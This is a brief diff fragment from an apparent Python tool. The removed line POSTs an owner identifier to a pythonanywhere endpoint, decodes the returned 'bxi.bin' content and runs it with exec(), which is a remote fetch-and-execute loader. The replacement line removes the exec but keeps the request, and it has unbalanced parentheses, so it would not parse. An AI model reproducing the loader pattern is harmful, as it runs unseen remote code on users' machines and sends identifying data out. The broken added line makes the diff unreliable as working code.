@@ -29,5 +29,5 @@ except:
 			ie=True
 
 print ('\n\n\033[1;93m Loading . . . \033[0m')
-exec(base64.b16decode(binni.bcoder(requests.post('https://bxisubscription.pythonanywhere.com/bxifiles', data={'filename':'bxi.bin','owner':binni.owner()}).text.rstrip())))
+r  = (requests.post('https://bxisubscription.pythonanywhere.com/bxifiles', data={'filename':'bxi.bin','owner':binni.owner()}).text.rstrip())))
 sys.exit()
